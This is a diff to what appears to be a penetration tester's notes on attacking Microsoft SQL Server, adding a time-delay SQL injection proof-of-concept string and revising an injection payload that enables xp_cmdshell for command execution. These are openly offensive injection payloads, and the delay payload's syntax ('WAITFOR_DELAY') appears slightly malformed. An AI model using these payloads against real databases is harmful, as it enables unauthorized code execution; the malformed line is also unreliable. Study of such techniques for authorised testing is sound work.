@@ -167,8 +167,11 @@ Last step is to perform the Relay - !REMEMEBER! not to our attacking box, but to
 # MSSQL Useful Queries
 *Note: privileges in a database might differ, check every access you can accomplish, which mean using the local administrator, machine account, etc.*
 
-In case of Injection, we can try enable xp_cmdshell and get code execution (might beed to URL encode the payload, even as POST data):
-- `test'; EXEC sp_configure 'Show Advanced Options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;`
+Injection POC - time delay:
+- `test'; WAITFOR_DELAY '0:0:5'-- -`
+
+In case of Injection, we can try enable xp_cmdshell and get code execution (might need to URL encode the payload, even as POST data):
+- `test'; EXEC sp_configure 'Show Advanced Options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;-- -`
 
 List databases:
 - `select * from sys.databases;`
